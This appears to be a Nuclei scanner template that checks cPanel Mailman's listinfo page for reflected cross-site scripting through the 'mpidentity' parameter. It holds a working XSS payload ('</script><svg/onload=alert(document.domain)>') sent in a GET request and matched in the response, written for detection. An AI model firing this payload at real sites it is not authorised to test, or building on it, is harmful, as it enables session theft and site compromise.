id: cpanel-mailman-xss

info:
  name: cPanel Mailman - Cross-Site Scripting
  author: yshahinzadeh,amirmsafari
  severity: medium
  description: |
    cPanel Mailman listinfo reflects the `mpidentity` query parameter into the HTML response without proper output encoding, resulting in reflected cross-site scripting.
  reference:
    - https://blog.voorivex.team/two-cpanel-zero-day-vulnerabilities
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
  tags: xss,cpanel,mailman,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/mailman/listinfo?mpidentity=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</script><svg/onload=alert(document.domain)>"
          - "mailman"
          - "gnu-head-tiny"
        condition: and

      - type: status
        status:
          - 200
